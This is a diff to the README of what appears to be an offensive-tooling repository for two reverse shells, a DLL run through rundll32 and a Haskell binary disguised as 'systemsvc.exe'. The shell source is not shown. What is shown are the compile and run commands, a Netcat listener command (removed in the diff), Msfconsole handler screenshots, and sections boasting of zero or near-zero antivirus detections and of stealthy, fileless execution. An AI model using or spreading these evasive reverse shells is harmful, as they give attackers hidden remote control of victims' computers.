@@ -23,7 +23,7 @@ During testing, **Windows 10 and Windows 11 did not flag this DLL as malicious**
  
 ### VirusTotal Scan Results  
 Additionally, when uploaded to **VirusTotal**, the file received **only 3 detections out of 72 antivirus engines**, indicating that many security solutions failed to recognize it as a threat. 
-![VirusTotal Scan](virus_total.png)
+![VirusTotal Scan](/screenshots/vt-dll.png)
 
 ## How to Compile and Run
 
@@ -41,7 +41,7 @@ Once the DLL is compiled, you can run it on a Windows System using the following
 ```bash
 rundll32.exe .\reverse_shell.dll reverse_shell
 ```
-![Windows Execution](windows_cmd.png)
+![Windows Execution](/screenshots/windows-dll-execution.png)
 
 ## Understanding the Code
 
@@ -136,6 +136,7 @@ These factors make this reverse shell **highly effective at evading detection** 
 - [DLL Injection Explained](https://attack.mitre.org/techniques/T1055/001/)
 
 ---
+---
 
 # systemsvc.exe - Haskell Reverse Shell - Stealthy PowerShell Execution
 
@@ -146,6 +147,16 @@ This is a **Haskell-based reverse shell** that establishes a connection to a rem
 - **0/73 detections on VirusTotal** – No antivirus engines flagged the compiled binary as malicious.  
 - Uses **Haskell runtime** to execute a reverse shell in a way that **minimizes heuristic-based detection**.  
 
+### VirusTotal Scan Results  
+![Windows Execution](/screenshots/vt-haskell.png)
+
+
+## Why This Code is Stealthy  
+
+**Fileless Execution Possible** – Can be compiled as a **memory-only payload**.  
+**Minimal Behavioral Footprint** – Runs PowerShell without spawning visible processes.  
+**No Antivirus Detections (0/73)** – Not flagged by VirusTotal.  
+
 ---
 
 ## Compiling and Running the Haskell Reverse Shell  
@@ -154,12 +165,17 @@ On **Windows**, use:
 ```powershell
 ghc --make systemsvc.hs -o systemsvc.exe -package process -package base
 ```
+![Compiling](/screenshots/windows-haskell-compilation.png)
+
 
 ### Executing the Reverse Shell on Windows  
 Once compiled, the executable can be run directly:  
 ```powershell
 .\systemsvc.exe
 ```
+## Msfconsole example
+![Msfconsole handler](/screenshots/haskell-msfconsole1.png)
+![Msfconsole powershell_to_meterpreter](/screenshots/haskell-msfconsole2.png)
 
 ## Code Walkthrough  
 
@@ -214,23 +230,6 @@ forever $ do
 
 ---
 
-## Why This Code is Stealthy  
-
-**Fileless Execution Possible** – Can be compiled as a **memory-only payload**.  
-**Bypasses Windows Defender** – No signature-based detections due to Haskell’s low malware footprint.  
-**Minimal Behavioral Footprint** – Runs PowerShell without spawning visible processes.  
-**No Antivirus Detections (0/73)** – Not flagged by VirusTotal.  
-
----
-
-## Example Listener Setup  
-Before running the reverse shell, set up a Netcat listener on your attack machine:  
-```bash
-nc -nvlp 4444
-```
-Once executed on the target system, you should receive a connection and be able to send PowerShell commands remotely.  
-
----
 
 ## Further Reading  
 
